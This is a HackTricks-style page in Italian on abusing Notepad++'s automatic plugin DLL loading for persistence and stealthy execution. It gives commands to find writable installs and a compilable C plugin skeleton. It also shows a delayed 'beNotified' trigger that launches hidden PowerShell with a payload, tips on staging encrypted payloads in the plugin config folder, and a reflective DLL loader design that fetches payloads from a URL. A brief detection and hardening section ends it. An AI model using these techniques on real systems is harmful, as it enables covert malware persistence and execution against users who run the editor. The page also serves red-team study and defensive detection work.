# Persistenza ed esecuzione tramite caricamento automatico dei plugin di Notepad++

{{#include ../../banners/hacktricks-training.md}}

All'avvio, Notepad++ **carica automaticamente ogni DLL di plugin trovata nelle sottocartelle `plugins`**. Inserire un plugin malevolo in qualsiasi **installazione di Notepad++ scrivibile** consente l'esecuzione di codice all'interno di `notepad++.exe` ogni volta che l'editor si avvia; questo può essere sfruttato per ottenere **persistence**, una **initial execution** furtiva o come **in-process loader** se l'editor viene avviato con privilegi elevati.<sup>[[1]](#references)</sup>

Dalla versione **Notepad++ 7.6+**, il layout previsto per l'installazione manuale prevede **una sottocartella per ogni plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presenza di `doLocalConf.xml` accanto a `notepad++.exe`), l'intero albero dell'applicazione rimane locale a quella directory, trasformando spesso i bundle di tool copiati o destinati agli amministratori in una superficie di esecuzione facilmente scrivibile dall'utente.<sup>[[2]](#references)</sup>

## Percorsi dei plugin scrivibili

- Installazione standard: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (di solito richiede privilegi di amministratore per la scrittura).<sup>[[1]](#references)</sup>
- Opzioni scrivibili per utenti con privilegi limitati:<sup>[[1]](#references)</sup>
  - Usare la **versione portable di Notepad++** in una cartella scrivibile dall'utente.
  - Copiare `C:\Program Files\Notepad++` in un percorso controllato dall'utente (ad es. `%LOCALAPPDATA%\npp\`) ed eseguire `notepad++.exe` da lì.
  - Cercare **bundle di tool per amministratori**, copie estratte da archivi zip o toolkit dell'help desk che contengano già `doLocalConf.xml` e si trovino al di fuori di `Program Files`.
- Ogni plugin ha una propria sottocartella sotto `plugins` e viene caricato automaticamente all'avvio; le voci di menu compaiono sotto **Plugins**.<sup>[[2]](#references)</sup>

Verifica rapida:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Punti di caricamento dei plugin (primitive di esecuzione)
Notepad++ si aspetta specifiche **funzioni esportate**. Vengono tutte chiamate durante l’inizializzazione, offrendo diverse superfici di esecuzione:<sup>[[1]](#references)</sup>
- **`DllMain`** — viene eseguita immediatamente al caricamento della DLL (primo punto di esecuzione).
- **`setInfo(NppData)`** — viene chiamata una volta al caricamento per fornire gli handle di Notepad++; è un punto tipico per registrare voci di menu.
- **`getName()`** — restituisce il nome del plugin visualizzato nel menu.
- **`getFuncsArray(int *nbF)`** — restituisce i comandi del menu; anche se è vuoto, viene chiamato durante l’avvio.
- **`beNotified(SCNotification*)`** — riceve gli eventi di Notepad++ / Scintilla (utile per rimandare i payload fino a un’azione dell’utente o a un evento dell’editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestore di messaggi, utile per scambi di dati più ampi.
- **`isUnicode()`** — flag di compatibilità verificato al caricamento.

La maggior parte delle funzioni esportate può essere implementata come **stub**; l’esecuzione può avvenire da `DllMain` o da una qualsiasi delle callback precedenti durante il caricamento automatico.

## Scheletro minimo di un plugin malevolo
Compila una DLL con le funzioni esportate previste e inseriscila in `plugins\\MyNewPlugin\\MyNewPlugin.dll` all’interno di una cartella di Notepad++ su cui è possibile scrivere:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Compila la DLL (Visual Studio/MinGW).
2. Crea la sottocartella del plugin in `plugins` e inserisci al suo interno la DLL.
3. Riavvia Notepad++; la DLL viene caricata automaticamente, eseguendo `DllMain` e i callback successivi.

## Pattern di attivazione a basso rumore tramite `beNotified`
Per ragioni di OPSEC, molti payload **non** dovrebbero attivarsi da `DllMain`. Un pattern più discreto consiste nel caricare il plugin senza problemi e poi eseguire il payload solo in seguito a un evento realistico dell’editor, come **il completamento dell’avvio**, **l’attivazione di un buffer** o **la digitazione del primo carattere**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Questo rispecchia meglio la ricerca offensiva pubblica rispetto a un beacon `DllMain` rumoroso: la DLL viene comunque caricata automaticamente all'avvio, ma l'azione malevola viene ritardata finché Notepad++ non sembra effettivamente in uso.

## Usare la directory di configurazione dei plugin come storage secondario
Notepad++ espone `NPPM_GETPLUGINSCONFIGDIR`, che restituisce la **directory di configurazione dei plugin dell'utente corrente**.<sup>[[3]](#references)</sup> Un plugin malevolo può usarla per mantenere minima la DLL su disco e archiviare config crittografata, payload staged o file di tasking in un percorso che si confonde con il normale stato dei plugin.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operativamente, questo è utile quando vuoi:
- una DLL bootstrap minima caricata automaticamente;
- tasking per utente senza dover modificare di nuovo il binario principale del plugin;
- separare il **trigger di autoload** dal secondo stage più pesante.

## Pattern del plugin Reflective DLL loader
Un plugin weaponizzato può trasformare Notepad++ in un **Reflective DLL loader**:<sup>[[1]](#references)</sup>
- Presenta una UI/voce di menu minimale (ad es., "LoadDLL").
- Accetta un **percorso file** o un **URL** da cui recuperare una payload DLL.
- Mappa la DLL in modo riflessivo nel processo corrente e invoca un entry point esportato (ad es., una funzione loader all'interno della DLL recuperata).
- Vantaggio: riutilizza un processo GUI dall'aspetto innocuo invece di avviare un nuovo loader; la payload eredita il livello di integrità di `notepad++.exe` (anche in contesti elevati).
- Compromessi: scrivere su disco una **DLL plugin non firmata** è rumoroso; una variante pratica consiste nell'usare il plugin caricato automaticamente solo come stub e mantenere l'impianto reale cifrato o staged altrove.

## Note su rilevamento e hardening
- Blocca o monitora le **scritture nelle directory dei plugin di Notepad++** (incluse le copie portabili nei profili utente); abilita l'accesso controllato alle cartelle o l'allowlisting delle applicazioni.
- Genera un alert per **nuove DLL non firmate** in `plugins`, modifiche agli alberi di directory delle copie portabili di Notepad++ e **attività anomale di processi figli o di rete** da `notepad++.exe`.
- Definisci una baseline dei plugin legittimi e verifica qualsiasi nuova DLL che esporti la normale interfaccia dei plugin di Notepad++, ma avvii anche shell, PowerShell o beacon di rete.
- Impone l'installazione dei plugin solo tramite **Plugins Admin** e limita l'esecuzione di copie portabili da percorsi non attendibili.

## References

- [1] [TrustedSec - Plugin di Notepad++: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Manuale utente di Notepad++ - Plugin](https://npp-user-manual.org/docs/plugins/)
- [3] [Manuale utente di Notepad++ - Comunicazione tra plugin](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
